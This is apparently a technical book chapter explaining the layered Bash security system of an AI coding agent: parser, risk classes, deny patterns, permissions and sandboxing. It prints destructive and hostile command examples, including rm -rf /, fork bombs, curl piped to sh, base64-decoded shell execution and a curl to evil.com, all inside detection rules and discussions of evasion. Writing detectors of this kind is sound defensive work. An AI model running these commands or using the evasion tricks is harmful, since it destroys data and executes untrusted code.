# Chapter 17: Bash Security & Command Analysis

The Bash tool is the most dangerous capability an AI coding agent can possess. Every other tool -- Read, Write, Grep, Glob -- operates within narrowly defined boundaries. The Bash tool hands the agent a shell. One well-crafted command can delete the user's home directory, exfiltrate secrets over the network, format a disk, or fork-bomb a machine into unresponsiveness. At the same time, the Bash tool is the most useful capability the agent has. Without it, there is no `git commit`, no `npm install`, no `cargo test`, no way to interact with the development environment as a real engineer would.

This tension -- maximum utility coupled with maximum risk -- demands a security system that is both comprehensive and surgically precise. Claude Code dedicates approximately 7,000 lines of TypeScript across eleven files to the problem. The architecture implements defense in depth: a shell parser that understands command structure, a pattern-matching engine that detects dangerous idioms, a risk classification system that rates every command on a four-level scale, a read-only validation database of 200+ commands, a permission evaluation engine that matches commands against user-configured rules, and a process-isolation layer that uses POSIX sessions and signal management to contain runaway processes.

This chapter walks through each layer, explaining what it does, why it exists, how to build it, and where the edge cases lurk.

---

## 17.1 Architecture Overview

The bash security system is not a single module. It is a pipeline of seven stages that every command passes through before execution:

```
User Input
    |
    v
[1. Input Parsing]        -- Extract command string, timeout, description
    |
    v
[2. Fork-Bomb Detection]  -- Pattern-match against known fork-bomb idioms
    |
    v
[3. Dangerous Patterns]   -- Hard-deny commands that are never legitimate
    |
    v
[4. BashValidator]        -- Permission-engine validation (sudo, deny-list)
    |
    v
[5. Risk Assessment]      -- Classify as Safe/ReadOnly/Write/Destructive
    |
    v
[6. Permission Check]     -- Match against user allow/deny rules
    |
    v
[7. Process Execution]    -- setsid isolation, timeout, signal management
```

Each stage operates independently. If stage 2 catches a fork bomb, stages 3 through 7 never run. If stage 4 blocks `sudo`, the risk assessment is irrelevant. This layered design means no single bypass can compromise the entire system -- an attacker would need to evade every layer simultaneously.

The files involved, mapped to their TypeScript originals:

| Module | Lines | Responsibility |
|--------|-------|----------------|
| `BashTool/index.ts` | ~800 | Tool entry point, Layer 1-3, process execution |
| `bashSecurity.ts` | ~2,600 | Hard-deny patterns, risk assessment, command substitution detection |
| `bashPermissions.ts` | ~2,600 | Permission rules, pattern matching, history-based learning |
| `readOnlyValidation.ts` | ~2,000 | 200+ command database, subcommand-aware read-only validation |
| `bashParser.ts` | ~4,400 | Tokenizer, recursive-descent parser, AST, risk analysis |
| `ast.ts` | ~2,700 | Full AST with visitor pattern, complexity analysis |
| `bashPipeCommand.ts` | ~1,400 | Pipeline analysis, data-flow tracing, side-effect detection |
| `heredoc.ts` | ~400 | Heredoc parsing (expanding, literal, indented) |
| `commandSpecs.ts` | ~600 | Command specification database, flag-aware risk scoring |
| `shellRules.ts` | ~440 | Glob-based permission matching, command decomposition |
| `dangerousPatterns.ts` | ~290 | Categorized pattern database with severity ratings |

The total is over 16,000 lines when you include the deep utilities. This is the largest security surface in the entire agent.

---

## 17.2 The Shell Parser

You cannot secure what you cannot parse. String matching on raw command text is fragile -- `echo "rm -rf /"` is a harmless echo statement, but a naive `rm -rf /` detector would flag it. The shell parser exists to understand command structure before making security decisions.

### 17.2.1 The Tokenizer

The tokenizer converts a raw command string into a sequence of typed tokens. It handles every construct that matters for security analysis:

```typescript
enum BashTokenKind {
  Word,                  // plain command name or argument
  SingleQuoted,          // 'literal string'
  DoubleQuoted,          // "string with $expansion"
  Variable,              // $VAR
  Expansion,             // ${VAR:-default}
  CommandSubstitution,   // $(cmd)
  BacktickSubstitution,  // `cmd`
  Pipe,                  // |
  PipeAnd,               // |&
  And,                   // &&
  Or,                    // ||
  Semicolon,             // ;
  Background,            // &
  RedirectOut,           // >
  RedirectAppend,        // >>
  RedirectIn,            // <
  HereDoc,               // <<
  HereString,            // <<<
  FdDup,                 // >& or <&
  ParenOpen,             // (
  ParenClose,            // )
  Assignment,            // VAR=value
  Glob,                  // *.rs, file?.txt
  Comment,               // # comment
}
```

The critical design decision is handling quoting correctly. In bash, single quotes suppress all expansion -- `$HOME` inside single quotes is the literal string `$HOME`. Double quotes allow variable expansion but suppress glob expansion and word splitting. The tokenizer tracks quoting state as it scans:

```typescript
function tokenize(input: string): BashToken[] {
  const tokens: BashToken[] = [];
  let i = 0;

  while (i < input.length) {
    // Single-quoted string: no expansion, consume until closing quote
    if (input[i] === "'") {
      const start = i++;
      let value = "";
      while (i < input.length && input[i] !== "'") {
        value += input[i++];
      }
      if (i >= input.length) {
        throw new ParseError(`Unterminated single quote at position ${start}`);
      }
      i++; // consume closing quote
      tokens.push({ kind: "SingleQuoted", value, position: start });
      continue;
    }

    // Double-quoted string: track backslash escapes
    if (input[i] === '"') {
      const start = i++;
      let value = "";
      while (i < input.length && input[i] !== '"') {
        if (input[i] === '\\' && i + 1 < input.length) {
          value += input[i] + input[i + 1];
          i += 2;
        } else {
          value += input[i++];
        }
      }
      if (i >= input.length) {
        throw new ParseError(`Unterminated double quote at position ${start}`);
      }
      i++;
      tokens.push({ kind: "DoubleQuoted", value, position: start });
      continue;
    }

    // Command substitution: $(cmd) with nesting
    if (input[i] === '$' && input[i + 1] === '(') {
      const start = i;
      i += 2;
      let depth = 1;
      let value = "";
      while (i < input.length && depth > 0) {
        if (input[i] === '(') depth++;
        else if (input[i] === ')') {
          depth--;
          if (depth === 0) break;
        }
        value += input[i++];
      }
      if (depth !== 0) {
        throw new ParseError(`Unterminated command substitution at ${start}`);
      }
      i++; // consume closing )
      tokens.push({ kind: "CommandSubstitution", value, position: start });
      continue;
    }
    // ... remaining token types
  }
  return tokens;
}
```

The nesting-depth tracking for command substitution is essential. `$(echo $(whoami))` contains a nested substitution. Without depth tracking, the parser would close the outer `$(...)` at the first `)`, corrupting the token stream.

### 17.2.2 The AST

The parser converts the token stream into an abstract syntax tree using recursive descent. The grammar follows standard POSIX shell precedence:

```
list        → and_or (';' and_or)* | and_or ('&' and_or)*
and_or      → pipeline ('&&' pipeline)* | pipeline ('||' pipeline)*
pipeline    → ['!'] command ('|' command)*
command     → simple_command | '(' list ')' | compound_command
simple_command → assignment* word+ redirection*
```

The AST node types map directly to shell constructs:

```typescript
type BashAst =
  | { type: "Simple"; command: SimpleCommand }
  | { type: "Pipeline"; commands: BashAst[] }
  | { type: "AndList"; commands: BashAst[] }
  | { type: "OrList"; commands: BashAst[] }
  | { type: "Sequence"; commands: BashAst[] }
  | { type: "Subshell"; inner: BashAst }
  | { type: "Background"; inner: BashAst }
  | { type: "Negation"; inner: BashAst }
  | { type: "Empty" };

interface SimpleCommand {
  assignments: Array<{ name: string; value: string }>;
  words: string[];
  redirections: Redirection[];
}
```

The AST supports structural queries that raw string matching cannot:

```typescript
// Extract every command name from arbitrarily nested structures
function commandNames(ast: BashAst): string[] {
  switch (ast.type) {
    case "Simple":
      return ast.command.words[0] ? [ast.command.words[0]] : [];
    case "Pipeline":
    case "AndList":
    case "OrList":
    case "Sequence":
      return ast.commands.flatMap(commandNames);
    case "Subshell":
    case "Background":
    case "Negation":
      return commandNames(ast.inner);
    case "Empty":
      return [];
  }
}

// Check if any branch contains a pipe
function hasPipe(ast: BashAst): boolean {
  if (ast.type === "Pipeline") return ast.commands.length > 1;
  if ("commands" in ast) return ast.commands.some(hasPipe);
  if ("inner" in ast) return hasPipe(ast.inner);
  return false;
}

// Collect all redirections for dangerous-target analysis
function allRedirections(ast: BashAst): Redirection[] {
  if (ast.type === "Simple") return ast.command.redirections;
  if ("commands" in ast) return ast.commands.flatMap(allRedirections);
  if ("inner" in ast) return allRedirections(ast.inner);
  return [];
}
```

This structural understanding is what separates a production-grade security system from grep-based pattern matching. When the security engine needs to check whether `curl` is piped to `sh`, it does not search for the substring `curl | sh`. It walks the AST, finds `Pipeline` nodes, extracts the command names from each stage, and checks whether a downloader feeds into a shell interpreter:

```typescript
function detectRemoteExecution(ast: BashAst): boolean {
  if (ast.type !== "Pipeline") return false;

  const names = ast.commands.map(c =>
    c.type === "Simple" ? c.command.words[0] : null
  ).filter(Boolean);

  const hasDownloader = names.some(n => ["curl", "wget"].includes(n));
  const hasShell = names.some(n => ["sh", "bash", "zsh", "dash"].includes(n));

  return hasDownloader && hasShell;
}
```

This correctly handles `curl -sL https://example.com/install | bash -x` where arbitrary flags appear between the command names, and correctly ignores `curl https://api.github.com | jq .data` where the right-hand side is not a shell.

### 17.2.3 Heredoc Handling

Heredocs are a particularly subtle parsing challenge. The `<<` operator introduces a block of inline text delimited by a marker word. The security implications depend on whether the delimiter is quoted:

```typescript
enum HeredocKind {
  Expanding,          // <<EOF   — shell expands $VAR and $(cmd) in body
  Literal,            // <<'EOF' — no expansion, safe
  IndentedExpanding,  // <<-EOF  — expands, strips leading tabs
  IndentedLiteral,    // <<-'EOF' — no expansion, strips tabs
}
```

An expanding heredoc means the shell will execute command substitutions inside the body. `cat <<EOF\n$(rm -rf /)\nEOF` would execute the deletion as part of expanding the heredoc body. The parser must detect this and elevate the risk assessment accordingly.

---

## 17.3 Command Classification

With a parsed AST in hand, the security system classifies every command on a four-level risk scale. This classification drives the permission engine's decision: auto-allow, prompt, or block.

### 17.3.1 The Risk Hierarchy

```typescript
enum BashRiskLevel {
  Safe,         // No side effects whatsoever
  ReadOnly,     // Reads state but does not modify it
  Write,        // Modifies state (routine dev work)
  Destructive,  // Can cause irreversible damage
}
```

The ordering is significant and enforced in code. For compound commands (pipes, chains), the system takes the maximum risk across all segments:

```typescript
function assessRisk(command: string): BashRiskLevel {
  const segments = splitCommandChain(command);
  let maxRisk = BashRiskLevel.Safe;

  for (const segment of segments) {
    const risk = assessSegmentRisk(segment.trim());
    maxRisk = elevate(maxRisk, risk);
  }

  // Command substitution elevates Safe/ReadOnly to Write
  if (hasCommandSubstitution(command) && maxRisk < BashRiskLevel.Write) {
    maxRisk = BashRiskLevel.Write;
  }

  return maxRisk;
}
```

The command-substitution elevation rule deserves attention. `echo $(date)` looks like a read-only echo command, but the `$(date)` executes arbitrary code at expansion time. The static analyzer cannot know what the substitution will produce, so it conservatively elevates the risk. This means `echo $(rm -rf /)` is classified as Write rather than ReadOnly -- and then the inner `rm -rf /` is caught by the dangerous pattern detector when the shell actually expands it.

### 17.3.2 Read-Only Command Database

The read-only validation module maintains a database of over 200 commands organized by category. Each entry specifies not just the command name but also which flags and subcommands preserve read-only status:

```typescript
interface ReadOnlyEntry {
  command: string;
  category: ReadOnlyCategory;  // git, filesystem, network, etc.
  description: string;
  writeFlags: string[];        // flags that make it NOT read-only
  readOnlySubcommands: string[];
  writeSubcommands: string[];
}
```

This granularity matters. `git` is not read-only, but `git log`, `git status`, `git diff`, `git show`, and `git branch` are. Meanwhile `git branch -D` is destructive even though `git branch` is read-only. The database captures these distinctions:

```typescript
const GIT_READ_ONLY_SUBCOMMANDS = [
  "log", "status", "diff", "show", "branch", "tag",
  "remote", "stash list", "rev-parse", "describe",
  "shortlog", "blame", "ls-files", "ls-tree",
  "cat-file", "reflog", "config --get", "config --list",
  "rev-list"
];

const GIT_WRITE_SUBCOMMANDS = [
  "commit", "push", "pull", "merge", "rebase",
  "cherry-pick", "checkout", "switch", "restore",
  "stash", "add", "rm", "mv", "init", "clone",
  "reset", "clean", "submodule"
];
```

The validation checks the full command against this database:

```typescript
function validateReadOnly(command: string): ValidationResult {
  const segments = splitCommandChain(command);
  const segmentResults: SegmentResult[] = [];
  let allReadOnly = true;

  for (const segment of segments) {
    const base = extractBaseCommand(segment);
    const entry = database.lookup(base);

    if (!entry) {
      // Unknown command: not provably read-only
      allReadOnly = false;
      segmentResults.push({
        command: segment,
        isReadOnly: false,
        reason: "unknown command - cannot verify read-only"
      });
      continue;
    }

    // Check for write-promoting flags
    for (const flag of entry.writeFlags) {
      if (segment.includes(flag)) {
        allReadOnly = false;
        segmentResults.push({
          command: segment,
          isReadOnly: false,
          reason: `flag '${flag}' makes this command non-read-only`
        });
        break;
      }
    }
    // ... subcommand checks
  }

  return { isReadOnly: allReadOnly, segments: segmentResults };
}
```

Unknown commands default to "not read-only." This is a critical design choice. A permissive default (assume unknown commands are read-only) would be catastrophic -- any new tool, custom script, or renamed binary would bypass the check. The conservative default means some safe commands require user approval, but no dangerous command slips through undetected.

### 17.3.3 Pipeline Analysis

The pipeline analyzer (`bashPipeCommand.ts`) does more than count risk levels. It traces data flow through each stage, identifying sources, filters, transforms, and sinks:

```typescript
enum StageRole {
  Source,      // generates data (cat, echo, curl)
  Filter,      // selects data (grep, head, tail)
  Transform,   // reshapes data (sed, awk, jq, sort)
  Sink,        // consumes data (wc, tee, xargs)
  SideEffect,  // modifies state (rm, mv, chmod)
}

interface DataFlow {
  stages: DataFlowStage[];
  inputSources: string[];
  outputSinks: string[];
  hasNetworkStage: boolean;
  hasDestructiveStage: boolean;
}
```

This analysis catches risks that per-command classification misses. Consider `find . -name '*.tmp' | xargs rm -rf`. The `find` command is read-only. The `rm -rf` command is destructive. But the security concern is not just that `rm` is destructive -- it is that `find`'s output drives `rm`'s arguments, potentially deleting far more files than the user expects. The pipeline analyzer sees `rm` in a `SideEffect` role at the end of a pipeline and flags the entire chain as destructive.

---

## 17.4 Dangerous Pattern Detection

Pattern detection is the innermost security layer -- the last line of defense for commands that must never execute regardless of any user-configured permission.

### 17.4.1 Hard-Deny Patterns

Hard-deny patterns use regex matching and cannot be overridden by configuration. They represent commands that are never legitimate when issued by an AI coding agent:

```typescript
const DENY_PATTERNS: Array<{ regex: RegExp; reason: string }> = [
  // Root filesystem destruction
  { regex: /rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?(-[a-zA-Z]*r[a-zA-Z]*\s+)?\/\s*$/,
    reason: "Recursive delete of root filesystem" },

  // Raw disk writes
  { regex: /\bdd\s+.*if=\/dev\/zero\s+.*of=\/dev\//,
    reason: "Raw disk overwrite" },

  // Fork bombs (all variants)
  { regex: /:\(\)\s*\{.*:\s*\|\s*:.*&\s*\}/,
    reason: "Fork bomb (classic colon form)" },

  // Remote code execution via pipe
  { regex: /\bcurl\b[^|]*\|\s*(?:ba)?sh\b/,
    reason: "Remote code execution: curl piped to shell" },

  // eval bypasses all static checks
  { regex: /(?:^|\s|;|&&|\|\|)eval\s/,
    reason: "eval allows arbitrary code execution" },

  // Shell parameter transformation attack
  { regex: /\$\{[^}]*@P\}/,
    reason: "Shell parameter transformation attack (${var@P})" },
];
```

The regex patterns require careful construction. The `rm -rf /` pattern must handle flag reordering (`rm -fr /`, `rm -r -f /`), interspersed flags (`rm -rfv /`), and trailing whitespace. The fork bomb patterns must catch the classic `:(){ :|:& };:` and its variants: no-space versions, named functions, dot-form, and f-form.

The `eval` block is notable. `eval` dynamically constructs and executes a command from a string, which means the static analyzer cannot determine what will actually run. Blocking `eval` wholesale is aggressive but correct for an AI agent -- there is no legitimate reason for the agent to dynamically compose and execute shell code when it can construct the command directly.

### 17.4.2 The Pattern Database

Beyond hard-deny patterns, a categorized database provides severity-rated patterns for the risk assessment engine:

```typescript
interface DangerousPattern {
  id: string;
  pattern: string;
  category: PatternCategory;
  severity: Severity;
  description: string;
  example: string;
}

enum PatternCategory {
  FileDestruction,
  PermissionEscalation,
  DiskDestruction,
  ResourceExhaustion,
  NetworkExfiltration,
  CodeExecution,
  SystemModification,
}
```

This database separates the what (matching patterns) from the so-what (severity and category). When the security analyzer reports findings, it can provide structured output:

```
[Critical] rm-rf-root: Recursive forced deletion from root (FileDestruction)
[High]     curl-pipe-sh: Downloads and executes remote code (CodeExecution)
[Medium]   eval-variable: Evaluates shell variable as code (CodeExecution)
```

The separation matters for the permission engine. A `Critical` finding triggers a hard block. A `High` finding triggers a user prompt with a warning. A `Medium` finding logs the concern but may auto-allow if the user has previously approved the pattern.

### 17.4.3 Fork-Bomb Detection

Fork bombs deserve their own dedicated detector because they exploit syntactic patterns that regex alone struggles with. The classic bash fork bomb `:(){ :|:& };:` uses the colon as both a function name and a no-op builtin, making it syntactically valid yet semantically catastrophic.

The detector normalizes whitespace before matching, because the same fork bomb can appear in many visual forms:

```typescript
function detectForkBomb(cmd: string): string | null {
  const normalized = cmd.replace(/ /g, "");
  const lower = cmd.toLowerCase();

  const patterns: Array<[string, string]> = [
    [":(){ :|:& };:", "classic bash fork bomb"],
    ["bomb(){ bomb|bomb& };bomb", "named fork bomb"],
    [".() { .|.& }; .", "dot fork bomb"],
    ["while true; do", "infinite loop"],
    ["for((;;));do", "infinite C-style loop"],
    ["yes |", "infinite yes pipe"],
    ["cat /dev/zero", "reading /dev/zero"],
    ["cat /dev/urandom", "reading /dev/urandom"],
  ];

  for (const [pattern, reason] of patterns) {
    const patNormalized = pattern.replace(/ /g, "");
    if (normalized.includes(patNormalized) || lower.includes(pattern)) {
      return reason;
    }
  }
  return null;
}
```

The `while true`, `for((;;))`, and `yes |` patterns catch infinite loops that, while not technically fork bombs, can exhaust CPU or memory just as effectively. The `/dev/zero` and `/dev/urandom` patterns catch reads from infinite sources that would fill available memory.

---

## 17.5 The Permission Engine

The permission engine (as introduced in Chapter 9) evaluates Bash commands against user-defined rules. For the Bash tool specifically, the evaluation is more complex than for other tools because a single Bash invocation can contain multiple commands with different risk profiles.

### 17.5.1 Rule Evaluation Order

Permission rules follow a strict evaluation order: deny rules are checked first, then allow rules, and finally the default policy (which is "ask" in standard mode, "allow" in auto mode for known-safe commands).

```typescript
function evaluatePermission(command: string): PermissionResult {
  const segments = splitCommandChain(command);

  // 1. Check deny rules first (any segment match = deny all)
  for (const rule of denyRules) {
    for (const segment of segments) {
      if (matchesPattern(segment.text, rule.pattern)) {
        return PermissionResult.deny(command, {
          decision: "Deny",
          ruleName: rule.name,
          explanation: `Matched deny rule: ${rule.pattern}`,
          matchedPattern: rule.pattern,
        });
      }
    }
  }

  // 2. Check allow rules (all segments must match)
  let allAllowed = true;
  for (const segment of segments) {
    let segmentAllowed = false;
    for (const rule of allowRules) {
      if (matchesPattern(segment.text, rule.pattern)) {
        segmentAllowed = true;
        break;
      }
    }
    if (!segmentAllowed) {
      allAllowed = false;
      break;
    }
  }

  if (allAllowed) {
    return PermissionResult.allow(command, { /* ... */ });
  }

  // 3. Default: ask the user
  return PermissionResult.ask(command, { /* ... */ });
}
```

The asymmetry is deliberate. A deny rule blocks the entire command if any segment matches. An allow rule only permits the command if every segment is covered. This means `git status && rm -rf /` is blocked even if `git status` is allowed, because `rm -rf /` matches a deny rule.

### 17.5.2 Glob Pattern Matching

Permission patterns use glob syntax, not regex. This is a user-experience decision -- developers are familiar with globs from `.gitignore` and shell expansion:

```json
{
  "permissions": {
    "allow": [
      "Bash(git diff *)",
      "Bash(git log *)",
      "Bash(cargo test *)",
      "Bash(ruff *)"
    ],
    "deny": [
      "Bash(rm -rf /)",
      "Bash(git push --force *)"
    ]
  }
}
```

The matching logic must handle compound commands correctly. `Bash(git diff *)` should match `git diff HEAD` but should not match `git diff HEAD && rm -rf /`. The implementation decomposes compound commands and matches each segment independently:

```typescript
function matchesPattern(command: string, pattern: string): boolean {
  const glob = new Glob(pattern);

  // Try full command first
  if (glob.matches(command.trim())) return true;

  // Try each decomposed segment
  const segments = decompose(command);
  for (const seg of segments) {
    const full = seg.args.length > 0
      ? `${seg.command} ${seg.args.join(" ")}`
      : seg.command;
    if (glob.matches(full)) return true;
    if (glob.matches(seg.command)) return true;
  }

  return false;
}
```

### 17.5.3 Wrapper Stripping

Commands are often prefixed with wrappers like `sudo`, `env`, `nohup`, or `time`. The permission engine strips these wrappers before matching, because the security-relevant part is the actual command being executed, not the wrapper:

```typescript
function extractBaseCommand(segment: string): [string, string[]] {
  const words = shellWordSplit(segment);
  const wrappers = ["env", "sudo", "nohup", "time", "nice", "strace"];
  let i = 0;

  while (i < words.length) {
    if (wrappers.includes(words[i])) {
      const isSudo = words[i] === "sudo";
      i++;
      // Skip wrapper flags
      while (i < words.length && words[i].startsWith("-")) {
        const flag = words[i];
        i++;
        // sudo flags that take arguments: -u, -g, -C, -D, -p
        if (isSudo && ["-u", "-g", "-C", "-D", "-p"].includes(flag)) {
          i++; // skip flag value
        }
      }
    } else {
      break;
    }
  }

  const command = words[i] || words[0];
  const args = words.slice(i + 1);
  return [command, args];
}
```

This correctly handles `sudo -u deploy npm install` -- the base command is `npm`, not `sudo`.

### 17.5.4 Sudo Blocking

Privilege escalation receives special treatment. The validator unconditionally blocks `sudo`, `doas`, `pkexec`, and `su -c` regardless of what follows:

```typescript
function usesSudo(command: string): boolean {
  for (const segment of splitCommandChain(command)) {
    const firstWord = segment.trim().split(/\s+/)[0];
    const base = firstWord.split("/").pop(); // strip path prefix
    if (["sudo", "doas", "pkexec"].includes(base)) return true;
    if (base === "su" && segment.includes(" -c")) return true;
  }
  return false;
}
```

This is checked early in the validation pipeline and cannot be overridden by user configuration. The rationale: an AI coding agent should never need elevated privileges. If a task genuinely requires root access, the user should configure their environment so the agent runs as the appropriate user, not hand the agent `sudo` permission.

---

## 17.6 Process Isolation and Execution

Security analysis is only half the problem. Even a correctly validated command can go wrong at runtime -- it might hang, consume excessive memory, or spawn processes that outlive the parent. The execution layer addresses these concerns.

### 17.6.1 Process Group Isolation

Every spawned command runs in its own POSIX session:

```typescript
const child = spawn("sh", ["-c", command], {
  cwd: workingDir,
  stdio: ["ignore", "pipe", "pipe"],
  detached: true,  // creates a new session via setsid()
});
```

The `detached: true` flag calls `setsid()` between `fork()` and `exec()`, placing the child process in a new session and process group. This isolation serves a critical purpose: when the agent needs to kill a timed-out command, it can send `SIGTERM` to the entire process group, killing the original process and all of its children.

Without session isolation, a command like `npm install` that spawns dozens of child processes would leave orphans when killed. Those orphans would continue running, consuming resources, and potentially holding locks that block subsequent commands.

### 17.6.2 Timeout and Signal Management

The timeout system implements a two-phase kill sequence:

```typescript
async function killProcessTree(pid: number): Promise<void> {
  const pgid = -pid; // negative PID targets the process group

  // Phase 1: SIGTERM (graceful shutdown)
  process.kill(pgid, "SIGTERM");

  // Phase 2: Wait grace period, then SIGKILL
  await sleep(SIGTERM_GRACE_PERIOD_SECS * 1000);
  try {
    process.kill(pgid, "SIGKILL");
  } catch {
    // Process already exited — ignore
  }
}
```

SIGTERM gives the process a chance to clean up -- close file handles, flush buffers, release locks. The five-second grace period is a compromise. Too short, and processes that need cleanup time (database operations, large file writes) are killed mid-operation. Too long, and the user waits unnecessarily for a clearly stuck process.

SIGKILL is the failsafe. It cannot be caught or ignored by the child process. After SIGKILL, the process is guaranteed to be dead (though zombie entries may linger until the parent calls `wait()`).

### 17.6.3 Output Truncation

Command output is capped at 100 KB. This is a context window protection measure -- a command that dumps a multi-megabyte log file would consume the agent's entire context if passed through untruncated:

```typescript
const MAX_OUTPUT_BYTES = 100 * 1024; // 100 KB

function formatOutput(stdout: Buffer, stderr: Buffer, exitCode: number): string {
  let text = `STDOUT:\n${stdout.length ? stdout.toString() : "(empty)"}\n`;
  text += `STDERR:\n${stderr.length ? stderr.toString() : "(empty)"}\n`;
  text += `Exit code: ${exitCode}`;

  if (text.length > MAX_OUTPUT_BYTES) {
    return truncateWithNotice(text, MAX_OUTPUT_BYTES);
  }
  return text;
}
```

The truncation preserves the start of the output (which usually contains the most relevant information) and appends a notice indicating how much was cut. This is preferable to tail-truncation because error messages and stack traces typically appear early in the output.

---

## 17.7 Sandbox Integration

For commands flagged with `dangerouslyDisableSandbox: false` (the default), the execution environment applies additional containment. The sandbox system provides three isolation dimensions:

### 17.7.1 Filesystem Isolation

The sandbox restricts which paths the child process can access:

```typescript
interface FilesystemPolicy {
  root: string;          // sandbox workspace root
  readonlyMounts: string[];  // ["/usr", "/lib", "/bin"]
  deniedPaths: string[];     // ["/etc/shadow", "~/.ssh", "~/.gnupg"]
  ephemeralWrites: boolean;  // writes don't persist after execution
  writableDirs: string[];    // [root + "/tmp", root + "/work"]
}
```

On macOS, this is enforced through `sandbox-exec` profiles. On Linux, `bwrap` (bubblewrap) provides filesystem namespacing. The denied paths list protects credentials that an agent should never access -- SSH keys, GPG keys, and shadow password files.

### 17.7.2 Network Isolation

By default, sandboxed commands have no network access. When network access is required (e.g., `npm install`, `pip install`), the policy can allowlist specific hosts:

```typescript
interface NetworkPolicy {
  allowNetwork: boolean;       // false by default
  allowedHosts: string[];      // e.g., ["registry.npmjs.org"]
  blockedPorts: number[];      // [22, 25, 445, 3389]
  allowLoopback: boolean;      // true -- localhost is always OK
  allowDns: boolean;           // true -- DNS resolution allowed
}
```

The blocked ports list prevents the agent from accidentally opening SSH sessions (22), sending email (25), or initiating SMB connections (445) or RDP sessions (3389) -- all protocols that an AI coding agent has no reason to use.

### 17.7.3 Resource Limits

The sandbox enforces memory, CPU, and process-count limits:

```typescript
interface ResourceLimits {
  timeout: Duration;          // wall-clock time (default: 30s)
  maxMemoryBytes: number;     // 512 MiB
  maxOpenFiles: number;       // 256
  maxProcesses: number;       // 32
  maxCpuSeconds: number;      // 30
  maxOutputBytes: number;     // 1 MiB
}
```

These limits protect against accidental resource exhaustion. A command that leaks memory will be killed at 512 MiB rather than consuming all available RAM. A command that spawns excessive child processes (perhaps a misconfigured build system) is capped at 32.

---

## 17.8 Concurrency Safety

The Bash tool implements a `is_concurrency_safe` method that returns `true` only if the command is classified as `ReadOnly` across all segments:

```typescript
isConcurrencySafe(input: { command: string }): boolean {
  return analyzeChain(input.command) === CommandClassification.ReadOnly;
}
```

This enables the agent to run multiple read-only Bash commands in parallel (as discussed in Chapter 13's tool concurrency system). `git status`, `git diff`, and `ls -la` can all execute simultaneously because they have no side effects and cannot interfere with each other.

Write and Destructive commands serialize automatically. This prevents race conditions where, for example, two concurrent `npm install` invocations corrupt `node_modules`, or a `git commit` races with a `git add`.

---

## 17.9 Integration with the Hook System

As covered in Chapter 10, the hook system fires `PreToolUse` hooks before any tool executes. For the Bash tool specifically, hooks receive the full command string and can block execution by returning exit code 2:

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "./.claude/hooks/block-destructive.sh"
      }]
    }]
  }
}
```

The hook receives JSON on stdin containing the tool input:

```json
{
  "tool_name": "Bash",
  "tool_input": {
    "command": "rm -rf /tmp/old-builds",
    "timeout": 120000
  }
}
```

This creates a two-layer defense: the built-in security system catches known dangerous patterns, and user-defined hooks catch organization-specific policies. A team might configure a hook that blocks `docker push` to production registries, `kubectl delete` in production namespaces, or `git push --force` to the `main` branch -- policies that the built-in system has no way to know about.

---

## 17.10 Edge Cases and Lessons

### Command Obfuscation

An adversary can attempt to evade detection through obfuscation: `r''m -rf /` (empty single quotes), `\r\m -rf /` (backslash-escaped characters), or base64 encoding (`echo cm0gLXJmIC8K | base64 -d | sh`). The security system addresses these:

1. **Quote handling** is built into the tokenizer -- empty quotes are stripped during tokenization, so `r''m` becomes `rm`.
2. **Escape handling** is part of the word-scanning logic.
3. **Base64 decode piped to shell** is caught as an obfuscated command pattern in the security analysis layer, flagged at `High` severity.

### The `eval` Problem

`eval` is unconditionally blocked because it defeats all static analysis. `eval "$USER_INPUT"` could expand to anything, and the security system has no way to predict the expanded form. This is occasionally inconvenient -- some legitimate shell patterns use `eval` for variable indirection -- but the security tradeoff is clear. The agent can almost always achieve the same result by constructing the command directly.

### Environment Variable Expansion

`echo $(date)` is classified as `Write` even though both `echo` and `date` are read-only. This is because `$(...)` is evaluated by the shell before the security system sees the expanded result. The command could be `echo $(curl evil.com | sh)` and the security system would only see `echo <some output>` after expansion. By elevating any command containing `$(...)` or backticks to at least `Write`, the system forces a permission check on commands that might be more dangerous than they appear.

### The Unknown Command Default

Any command not in the read-only or write databases defaults to `Write` risk. This conservative default is essential. Users install custom tools, create shell scripts, and alias commands. If `my-custom-deploy-tool` defaulted to `Safe`, it would execute without any permission check despite being an unknown binary that could do anything. The `Write` default means the permission engine will either match it against an allow rule or prompt the user.

---

## 17.11 Building Your Own Bash Security System

If you are building an AI coding agent that needs shell access, here is the minimum viable security stack:

1. **Parse before evaluating.** Build or use a shell tokenizer that handles quoting and substitution. Never regex-match against raw input.

2. **Classify commands structurally.** Walk an AST, not strings. Classify each pipeline stage independently and take the maximum risk.

3. **Hard-block the unambiguous.** Fork bombs, `rm -rf /`, raw disk writes, and `curl | sh` should never execute. Make these non-configurable.

4. **Block `eval` and `sudo`.** Neither has a legitimate use case for an AI agent.

5. **Default unknown to unsafe.** Any command you do not recognize is `Write` at minimum. Never default to `Safe`.

6. **Isolate processes.** Use `setsid()` so you can kill entire process trees. Implement two-phase termination (SIGTERM then SIGKILL).

7. **Cap output.** Truncate to a size that fits your context window. Large outputs waste tokens and degrade agent performance.

8. **Integrate with the permission system.** The bash security layer should inform, not replace, the permission engine. Let users configure allow/deny rules on top of the built-in protections.

The Claude Code implementation goes further with pipeline data-flow analysis, command-spec databases, heredoc handling, and history-based permission learning. But the eight principles above will catch the vast majority of dangerous commands and establish a security posture that users can trust.

---

## Summary

The Bash tool's security infrastructure is the most complex subsystem in the entire agent. Seven layers of defense -- fork-bomb detection, dangerous pattern matching, hard-deny validation, risk classification, read-only verification, permission evaluation, and process isolation -- work together to make shell access safe enough to grant to an AI. The shell parser provides the structural understanding that makes accurate classification possible. The pattern databases capture the long tail of dangerous idioms. The process isolation layer ensures that even correctly validated commands cannot escape their containment.

In the next chapter, we will examine the Read and Write tools -- which face a different but equally important security challenge: preventing the agent from accessing files it should not see and modifying files it should not touch.
